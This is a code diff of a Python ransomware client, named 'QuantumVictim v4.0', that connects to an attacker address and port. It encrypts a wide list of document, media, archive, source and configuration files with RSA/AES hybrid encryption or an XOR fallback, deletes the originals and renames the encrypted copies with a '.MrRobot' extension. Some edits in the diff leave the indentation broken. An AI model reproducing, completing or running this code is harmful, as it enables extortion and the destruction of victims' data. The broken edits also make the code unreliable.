@@ -88,649 +88,320 @@ class EncryptionEngine:
     def load_public_key(self, public_key_pem):
 
         """Load RSA public key from PEM string"""
-
         if not self.crypto_available:
-
             return False
-
         
-
         try:
-
             # Restore newlines from JSON escaped format
-
             if '\\n' in public_key_pem:
-
                 public_key_pem = public_key_pem.replace('\\n', '\n').replace('\\r', '\r')
-
-            
-
+          
             from Cryptodome.PublicKey import RSA
-
             self.public_key = RSA.import_key(public_key_pem.strip())
-
             return True
-
         except Exception as e:
-
             print(f"    [!] Failed to load public key: {e}")
-
-            return False
-
-    
-
+            return False   
     def load_private_key(self, private_key_pem):
-
         """Load RSA private key from PEM string"""
-
         if not self.crypto_available:
-
-            return False
-
-        
-
+            return False    
         try:
-
             # Restore newlines from JSON escaped format
-
             if '\\n' in private_key_pem:
-
                 private_key_pem = private_key_pem.replace('\\n', '\n').replace('\\r', '\r')
-
-            
-
-            from Cryptodome.PublicKey import RSA
-
+              from Cryptodome.PublicKey import RSA
             self.private_key = RSA.import_key(private_key_pem.strip())
-
             return True
-
         except Exception as e:
-
             print(f"    [!] Failed to load private key: {e}")
-
             return False
-
-    
 
     def encrypt_file(self, file_path, delete_original=True):
-
         """Encrypt file using RSA/AES hybrid encryption"""
-
         if not self.crypto_available:
-
             print(f"    [!] Crypto libraries not available, using fallback")
-
             return self._encrypt_fallback(file_path, delete_original)
-
-        
-
         if not self.public_key:
-
             print(f"    [!] No public key available")
-
             return False
-
         
-
         try:
-
             # Read file data
-
             with open(file_path, 'rb') as f:
-
                 file_data = f.read()
-
-            
-
+         
             if len(file_data) == 0:
-
                 return False
-
             
-
             print(f"    [RSA/AES] Encrypting: {os.path.basename(file_path)} ({len(file_data)} bytes)")
-
             
-
             # Generate random AES key for this file (32 bytes = 256-bit)
-
             from Cryptodome.Random import get_random_bytes
-
             from Cryptodome.Cipher import AES, PKCS1_OAEP
-
             from Cryptodome.Util.Padding import pad
-
             
-
             aes_key = get_random_bytes(32)  # AES-256 key
-
             iv = get_random_bytes(16)       # Initialization vector
-
-            
-
+           
             # Encrypt file data with AES-CBC
-
             cipher_aes = AES.new(aes_key, AES.MODE_CBC, iv)
-
             padded_data = pad(file_data, AES.block_size)
-
             encrypted_data = cipher_aes.encrypt(padded_data)
-
             
-
             # Encrypt AES key with RSA
-
             cipher_rsa = PKCS1_OAEP.new(self.public_key)
-
             encrypted_aes_key = cipher_rsa.encrypt(aes_key)
-
             
-
             # Create file header
-
             header = struct.pack('!4s', b'MRRB')  # Magic bytes
-
             header += struct.pack('!H', 1)        # Version
-
             header += struct.pack('!I', len(encrypted_aes_key))
-
             header += struct.pack('!I', len(iv))
-
             header += struct.pack('!Q', len(file_data))  # Original size
-
             
-
             # Write encrypted file
-
             encrypted_path = file_path + self.encrypted_extension
-
             with open(encrypted_path, 'wb') as f:
-
                 f.write(header)
-
                 f.write(encrypted_aes_key)
-
                 f.write(iv)
-
                 f.write(encrypted_data)
-
             
-
             # Verify encryption
-
             if os.path.exists(encrypted_path) and os.path.getsize(encrypted_path) > 0:
-
                 if delete_original:
-
                     try:
-
                         os.remove(file_path)
-
-                    except:
-
+                 except:
                         pass
-
                 print(f"    [✓] Encrypted successfully")
-
                 return True
-
             else:
-
                 print(f"    [!] Failed to create encrypted file")
-
                 return False
-
             
-
         except Exception as e:
-
             print(f"    [!] RSA/AES encryption error: {e}")
-
             traceback.print_exc()
-
             return False
-
     
-
     def decrypt_file(self, encrypted_path):
-
         """Decrypt file using RSA private key"""
-
         if not self.crypto_available:
-
             print(f"    [!] Crypto libraries not available, using fallback")
-
             return self._decrypt_fallback(encrypted_path)
-
         
-
         if not self.private_key:
-
             print(f"    [!] No private key available")
-
             return False
-
         
-
         if not encrypted_path.endswith(self.encrypted_extension):
-
             return False
-
         
-
         try:
-
             with open(encrypted_path, 'rb') as f:
-
                 # Read header
-
                 magic = f.read(4)
-
                 if magic != b'MRRB':
-
                     return False
-
                 
-
                 version = struct.unpack('!H', f.read(2))[0]
-
                 aes_key_size = struct.unpack('!I', f.read(4))[0]
-
                 iv_size = struct.unpack('!I', f.read(4))[0]
-
                 original_size = struct.unpack('!Q', f.read(8))[0]
-
                 
-
                 # Read encrypted components
-
                 encrypted_aes_key = f.read(aes_key_size)
-
                 iv = f.read(iv_size)
-
                 encrypted_data = f.read()
-
             
-
             print(f"    [RSA/AES] Decrypting: {os.path.basename(encrypted_path)}")
-
             
-
-            # Decrypt AES key with RSA
-
+           # Decrypt AES key with RSA
             from Cryptodome.Cipher import AES, PKCS1_OAEP
-
             from Cryptodome.Util.Padding import unpad
-
             
-
             cipher_rsa = PKCS1_OAEP.new(self.private_key)
-
             aes_key = cipher_rsa.decrypt(encrypted_aes_key)
-
             
-
             # Decrypt file data with AES-CBC
-
             cipher_aes = AES.new(aes_key, AES.MODE_CBC, iv)
-
             padded_data = cipher_aes.decrypt(encrypted_data)
-
             file_data = unpad(padded_data, AES.block_size)
-
             
-
-            # Verify size
-
+           # Verify size
             if len(file_data) != original_size:
-
                 print(f"    [!] Size mismatch: expected {original_size}, got {len(file_data)}")
-
                 return False
-
             
-
             # Write decrypted file
-
             original_path = encrypted_path.replace(self.encrypted_extension, '')
-
             with open(original_path, 'wb') as f:
-
                 f.write(file_data)
-
             
-
             # Remove encrypted file
-
             os.remove(encrypted_path)
-
             print(f"    [✓] Decrypted successfully")
-
             return True
-
             
-
         except Exception as e:
-
             print(f"    [!] RSA/AES decryption error: {e}")
-
             return False
-
     
-
     def _encrypt_fallback(self, file_path, delete_original=True):
-
         """Fallback XOR encryption if crypto not available"""
-
         try:
-
             with open(file_path, 'rb') as f:
-
                 data = f.read()
-
             
-
             if len(data) == 0:
-
                 return False
-
             
-
             print(f"    [FALLBACK] Encrypting: {os.path.basename(file_path)}")
-
             
-
             # Simple XOR with random key
-
             key = secrets.token_bytes(32)
-
             key_len = len(key)
-
             encrypted = bytearray(data)
-
             
-
             for i in range(len(encrypted)):
-
                 encrypted[i] ^= key[i % key_len]
-
             
-
             # Add header for fallback
-
             header = struct.pack('!4s', b'FALL')  # Fallback magic
-
             header += struct.pack('!H', 1)        # Version
-
             header += struct.pack('!I', len(key))
-
             header += struct.pack('!Q', len(data))
-
             
-
             encrypted_path = file_path + self.encrypted_extension
-
             with open(encrypted_path, 'wb') as f:
-
                 f.write(header)
-
                 f.write(key)
-
                 f.write(encrypted)
-
             
-
             if delete_original and os.path.exists(encrypted_path):
-
                 os.remove(file_path)
-
                 print(f"    [✓] Fallback encryption successful")
-
                 return True
-
             
-
             return False
-
             
-
         except Exception as e:
-
             print(f"    [!] Fallback encryption error: {e}")
-
             return False
-
     
-
     def _decrypt_fallback(self, encrypted_path):
-
         """Fallback XOR decryption"""
-
         if not encrypted_path.endswith(self.encrypted_extension):
-
             return False
-
         
-
         try:
-
             with open(encrypted_path, 'rb') as f:
-
                 magic = f.read(4)
-
                 if magic != b'FALL':
-
                     return False
-
                 
-
                 version = struct.unpack('!H', f.read(2))[0]
-
                 key_size = struct.unpack('!I', f.read(4))[0]
-
-                original_size = struct.unpack('!Q', f.read(8))[0]
-
-                
-
+                original_size = struct.unpack('!Q', f.read(8))[0]  
                 key = f.read(key_size)
-
                 encrypted = f.read()
-
-            
-
+           
             print(f"    [FALLBACK] Decrypting: {os.path.basename(encrypted_path)}")
-
             
-
-            # XOR decryption
-
+           # XOR decryption
             key_len = len(key)
-
-            decrypted = bytearray(encrypted)
-
-            
-
+            decrypted = bytearray(encrypted)      
             for i in range(len(decrypted)):
-
                 decrypted[i] ^= key[i % key_len]
-
-            
-
             # Verify size
-
             if len(decrypted) != original_size:
-
                 return False
-
             
-
             original_path = encrypted_path.replace(self.encrypted_extension, '')
-
             with open(original_path, 'wb') as f:
-
                 f.write(decrypted)
-
             
-
             os.remove(encrypted_path)
-
             print(f"    [✓] Fallback decryption successful")
-
             return True
-
             
-
         except Exception as e:
-
             print(f"    [!] Fallback decryption error: {e}")
-
             return False
-
-
 
 class QuantumVictim:
-
     """Main Victim Client"""
-
     
-
     def __init__(self, attacker_ip='192.168.174.128', attacker_port=5555):
-
         self.attacker_ip = attacker_ip
-
         self.attacker_port = attacker_port
-
         self.socket = None
-
         self.running = False
-
         self.victim_id = None
-
         self.connection_time = None
-
         
-
         # Encryption engine
-
         self.encryption_engine = EncryptionEngine()
-
         
-
         # Print mask
-
         print(MASK)
-
         print(f"\n{'='*80}")
-
         print("QUANTUM VICTIM v4.0 - RSA/AES ENCRYPTION")
-
         print(f"{'='*80}")
-
         
-
         # Target extensions
-
         self.target_extensions = [
-
             '.txt', '.doc', '.docx', '.pdf', '.rtf', '.odt',
-
             '.xls', '.xlsx', '.csv', '.ods', '.ppt', '.pptx',
-
             '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.mp3', 
-
             '.mp4', '.avi', '.mkv', '.mov', '.wav', '.flac',
-
             '.zip', '.rar', '.7z', '.tar', '.gz',
-
             '.py', '.java', '.cpp', '.c', '.js', '.html', 
-
             '.css', '.php', '.xml', '.json', '.sql', '.db',
-
             '.ini', '.cfg', '.conf', '.config', '.yml', '.yaml'
-
         ]
-
         
-
         # Excluded directories
-
         self.excluded_dirs = []
-
         if os.name == 'nt':
-
             self.excluded_dirs = [
-
                 'C:\\Windows\\',
-
                 'C:\\Program Files\\',
-
                 'C:\\Program Files (x86)\\',
-
                 'C:\\$Recycle.Bin\\',
-
             ]
-
         else:
-
             self.excluded_dirs = [
-
                 '/bin/', '/usr/bin/', '/usr/local/bin/',
-
                 '/lib/', '/usr/lib/', '/etc/', '/var/',
-
             ]
-
         
-
         current_dir = os.path.dirname(os.path.abspath(__file__))
-
         self.excluded_dirs.append(current_dir + os.sep)
-
-        
-
+       
         print(f"[+] Attacker: {attacker_ip}:{attacker_port}")
-
         print(f"[+] Encryption: RSA/AES Hybrid")
-
         print(f"[+] Crypto Available: {self.encryption_engine.crypto_available}")
-
         print(f"[+] Encrypted extension: .MrRobot")
-
         print(f"[+] Platform: {platform.system()}")
-
         
-
         try:
-
             print(f"[+] User: {os.getlogin()}")
-
         except:
-
             print(f"[+] User: SYSTEM")
-
-        
-
+       
         print(f"{'='*80}")
-
     
-
     def _get_victim_id(self):
-
         """Generate unique victim ID"""
-
         hostname = socket.gethostname()
-
         uid = hashlib.sha256(
-
             f"{hostname}{platform.node()}{os.getpid()}".encode()
-
         ).hexdigest()[:16]
-
         return f"{hostname}-{uid}"
-
     
-
     def connect(self):
 
         """Connect to attacker with retry logic"""
